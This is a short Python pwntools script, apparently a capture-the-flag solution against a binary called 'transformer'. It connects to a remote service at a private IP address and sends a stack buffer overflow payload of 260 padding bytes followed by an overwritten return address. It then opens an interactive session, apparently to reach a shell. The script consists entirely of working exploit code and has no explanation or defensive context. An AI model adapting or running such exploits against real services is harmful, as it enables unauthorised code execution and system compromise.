#!/usr/bin/python

from pwn import *

def main() :
	# p = process("./transformer")

	# raw_input(str(p.proc.pid))

	p = remote("192.168.0.31", 10006)

	payload = "A" * 260
	ret_addr = 0x0804857b

	payload += p32(ret_addr)
	p.sendline(payload)

	payload = "B"

	p.sendline(payload)

	data = p.recvrepeat(0.2)
	# log.info(data)
	p.interactive()

if __name__ == "__main__":
	main()